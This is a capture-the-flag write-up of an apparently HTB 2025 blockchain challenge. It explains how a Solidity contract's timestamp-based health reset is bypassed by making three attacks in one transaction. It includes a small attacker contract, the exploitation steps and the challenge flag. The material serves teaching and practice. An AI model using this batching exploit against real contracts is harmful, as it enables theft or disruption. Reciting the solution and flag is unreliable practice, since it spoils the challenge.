# Eldorion Blockchain Challenge Writeup

## Challenge Overview
The Eldorion challenge is a blockchain-based CTF from HTB 2025. The objective is to defeat the "Eldorion" smart contract by reducing its health to exactly 0.

## Vulnerability Analysis

The challenge consists of two main contracts:

1. **Setup.sol** - Entry point that deploys and references the target Eldorion contract.
2. **Eldorion.sol** - The contract we need to defeat.

### Key Vulnerability

The vulnerability lies in the `eternalResilience` modifier in the Eldorion contract:

```solidity
modifier eternalResilience() {
    if (block.timestamp > lastAttackTimestamp) {
        health = MAX_HEALTH;
        lastAttackTimestamp = block.timestamp;
    }
    _;
}
```

This modifier is applied to the `attack()` function. It resets the health to MAX_HEALTH (300) whenever a new block timestamp is encountered. 

The crucial vulnerability is that the health only resets when the timestamp changes. Multiple attacks in the same block will bypass this health reset mechanism.

### Exploitation Strategy

The Eldorion contract has:
- Initial health of 300
- MAX_HEALTH of 300
- A limit of 100 damage per attack

To defeat Eldorion, we need to:
1. Make three attacks of 100 damage each
2. Ensure all three attacks happen within the same block (same timestamp)
3. This will reduce health from 300 to exactly 0

## Solution

The solution is to deploy an attacker contract that makes three calls to Eldorion's `attack()` function in a single transaction, which guarantees they execute at the same timestamp.

### Attacker Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
    function isDefeated() external view returns (bool);
}

contract EldorionAttacker {
    IEldorion public immutable target;
    
    constructor(address _target) {
        target = IEldorion(_target);
    }
    
    function executeAttack() external {
        // Execute three attacks with 100 damage each in a single transaction
        target.attack(100);
        target.attack(100);
        target.attack(100);
        
        // Verify Eldorion is defeated
        require(target.isDefeated(), "Eldorion not defeated");
    }
}
```

### Exploitation Steps

1. Connected to the challenge server at 94.237.63.28:38259 to get the setup information:
   - Player account private key and address
   - Target (Eldorion) contract address
   - Setup contract address

2. Compiled the EldorionAttacker contract with Solidity 0.8.28.

3. Deployed the attacker contract, passing the Eldorion contract address as the constructor parameter.

4. Called the `executeAttack()` function, which:
   - Made three `attack(100)` calls in a single transaction
   - Each attack dealt 100 damage
   - The health went from 300 → 200 → 100 → 0
   - The contract verified Eldorion was defeated

5. After executing the attack transaction, the `EldorionDefeated` event was emitted, confirming the successful exploit.

6. Retrieved the flag from the challenge server by selecting option 3 (Get flag).

## Lessons Learned

1. **Timestamp Manipulation**: The vulnerability demonstrates how timestamp-based conditions can be bypassed if multiple operations happen within the same block.

2. **Smart Contract Design Issues**: The `eternalResilience` modifier was intended to protect Eldorion by resetting health on each new attack, but failed to account for multiple attacks in the same transaction.

3. **Block Atomicity**: All operations within a single transaction execute atomically (or not at all), which allowed us to make all attacks before the health reset could take effect.

## Flag

```
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```

The flag references our "triple hit combo" attack strategy which defeated Eldorion.
